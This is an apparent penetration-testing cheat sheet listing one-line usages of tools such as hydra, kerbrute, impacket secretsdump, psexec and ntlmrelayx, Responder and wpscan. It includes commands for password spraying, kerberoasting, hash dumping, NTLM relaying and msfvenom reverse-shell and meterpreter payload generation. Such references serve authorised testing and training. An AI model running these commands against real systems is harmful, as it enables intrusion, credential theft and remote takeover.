# aquatone screenshot all urls in a given file and generate a nice html overview
cat <urls-in-file> | aquatone -out <out-folder>

# bloodhound-python BloodHound ingestor
bloodhound-python -u '<username>' -p 'password' -dc <dc-hostname> -d <fqdn> -c ALL [--hashes 'LM:NLTM'] [-ns <name-server-ip-to-use>]

# cewl generate a password list from a website; -w out file, -d search-depth 2, -m minimum length 5
cewl -w <file-name>.txt --with-numbers -d 2 -m 7 <target-url>

# dirsearch with input target list -l
dirsearch -l <target-list> --full-url

# dirsearch with standard wordlist; -b scan domain not ip; -F follow redirects; -r recourse with depth <l>; --full-url full url in report
dirsearch -u '<target-url>' -b -F -r --recursion-depth=<l> --full-url --format=csv -o <out-file>.csv

# evil-winrm interactive shell with username and password or hash
evil-winrm -i <target-ip> -u <username> [-p <password> | -H <hash>]

# ffuf keyword FUZZ in a request file; --request the request file; -w path to wordlist; -t threads; -f[clrsw] filter code,lines,regex,size,words; -m[clrsw] match
ffuf --request <req-file> -w <wordlist> -t <t> -fs <filter-size> [--request-proto http --replay-proxy http://127.0.0.1:8080]

# gobuster fuzz for directories with wordlist; -o out file, -r follow redirects, -k ignore ssl certificate errors, -w wordlist, -x file extensions to append
gobuster dir -u '<target-url>' -o <out-file> -r -k -w <path-to-wordlist> [-x php,aspx,html,txt]

# hashcat generate a password list with a given start list and a given rule
hashcat --force --stdout -r <path-to-rule> <in-list>

# hashcat show examples hashes to find the correct mode
hashcat --example-hashes

# hydra brute force different protocols; -V show all attempts; -t number of threads; protocol can be [ssh|rdp|ftp|imap|mssql|mysql|oracle-*|smtp|smb|vnc|...]
hydra -V [-t <threads>] -L <user-file> -P <password-file> <protocol>://<target.ip>

# impacket-GetADUsers enumerate AD users with and password
impacket-GetADUsers -all '<fqdn>/[<username>:<password>]' -dc-ip <dc-ip-address>

# impacket-GetADUsers enumerate AD users with hash
impacket-GetADUsers -all '<fqdn>/<username>' -dc-ip <dc-ip-address> -hashes '<LMHASH>:<NTHASH>'

# impacket-GetUserSPNs get all users and hashes in AD that have NO preauthentication enabled
impacket-GetUserSPNs '<fqdn>/[<username>]'  -dc-ip <dc-ip> [-request -outputfile <out-file>]

# impacket-GetUserSPNs get user accounts with more than one service principal name (= kerberoastable) and request a TGS for them
impacket-GetUserSPNs '<fqdn>/<user>:<password>' -dc-ip <dc-ip> [-request -outputfile <out-file>]

# impacket-ntlmrelayx LDAP/SMB... relaying attack; -tf Tagget file; with -t ldap://<ip>, ldaps://<ip>, smb://<ip> single target
impacket-ntlmrelayx -tf <dc-ip.list>

# impacket-psexec interactive shell as Administrator with username and password or with hashes
impacket-psexec '<fqdn>/<username>[:<password>]@<target-ip-or-host>' [-hashes LMHASH:NTHASH] [-dc-ip <dc-ip>]

# impacket-secretsdump dump hashes from a local copy of sam system and security hives
impacket-secretsdump -sam <path-to-sam> -system <path-to-system> -security <path-to-security> LOCAL -outputfile <out-file>

# impacket-secretsdump dump hashes remotely
impacket-secretsdump '<fqdn">/<username>:<password>@<target-ip-or-hostname>' -dc-ip <dc-ip> -outputfile <out-file>

# kerbrute bruteforce; -dc dc ip; -d fqdn; -o outfile; -v verbose; list of usernames and passwords separated by ":" ;
kerbrute bruteforce --dc <dc-ip> -d <fqdn> -o <out-file> [-v] <list-users-passwords-separeted-with-:>

# kerbrute passwordspray; -dc dc ip; -d fqdn; -o outfile; -v verbose; list of usernames; password to try
kerbrute passwordspray --dc <dc-ip> -d <fqdn> -o <out-file> [-v] <username-list> <password-to-try>

# kerbrute userenum enumerate usernames; --dc dc ip; -d fqdn; -o outfile; -v verbose; name list
kerbrute userenum --dc <dc-ip> -d <fqdn> -o <out-file> [-v] <name-list>

# ldapdomaindump dump the domain ldap info human readable as html and json
ldapdomaindump -u '<fqdn>\<username>' -p '<password-or-LM:NTLM-hash>' -o <outfolder> <dc-ip>

# ldapsaerch get naming contexts
ldapsearch -h <dc-ip> -x -s base namingcontexts

# ldapsearch dump raw AD information from DC anonymously
ldapsearch -x -H ldap://<dc-ip> -b '' -s base '(objectclass=*)'

# ldapsearch raw raw AD users from DC anonymously
ldapsearch -x -H ldap://<dc-ip> -b 'DC=<domain>,DC=<domain-suffix>' '(objectClass=person)'

# msfvenom generate java tcp reverse shell with file format war or jsp (raw) for tomcat deployment
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f [war|raw]

# msfvenom generate meterpreter with file format exe for windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe

# msfvenom list available payloads
msfvenom -l payloads

# nikto with conssole output an html outfile; -Tuning 1234bde Test for 1: Interesting File / Seen in logs 2: Misconfiguration / Default File 3: Information Disclosure 4: Injection (XSS/Script/HTML)  b: Software Identification
nikto -Display 1234EP -Tuning 1234bde -o <file-name>.html -Format htm -host '<target-url>'

# Responder.py analyze mode; Listen for packages and list them on screen
Responder.py -I <interface> -A

# Responder.py start spoofing attack
Responder.py -I <interface>

# rpcclient interactive session; -U <user>; -N anonymous login
rpcclient [-U <user>| -N] <target-ip-or-domain>

# smbclient interactive smb connection; -W domain; -U user name
smbclient \\\\<ip-or-hostname>\\<share-name> [-W <domain-name> -U <user>]

# smbclient list shares; -L list shares; -N anonymous auth; -U user;
smbclient -L <ip-or-hostname> [-N | -U <user>]

# smbmap download file
smbmap -H <target-ip-or-domain> [-u <username> -p <password-or-hash> -d <fqdn>] --download '.\Path\To\File'

# smbmap list authenticated all accessible files
smbmap -H <target-ip-or-domain> -u <username> -p <password-or-hash> -d <fqdn> -R <share>

# smbmap list unauthenticated SMB shares with permissions
smbmap -H <target-ip-or-domain>

# smbserver.py start an impacket smb server
smbserver.py [-username <username> -password <password>] <sharename> <path-to-mount-folder>

# wfuzz fuzz a get parameter with; -f out file; --hw hide response with word count; --hh hide response with character count; --hc <code> hide response code <code>
wfuzz --hw <word-count> -f <out-file> -w <wordlist> 'https://target.url?param1=FUZZ&param2=42'

# wpscan do a wordpress scan for; vp vulnerable plugins, vt Vulnerable themes, cb Config backups, dbe Db exports, u Users and write the result to <out-file>
wpscan --url <target-url> -e vp,vt,cb,dbe,u -o <out-file>

# wpscan update the plugin db
wpscan --update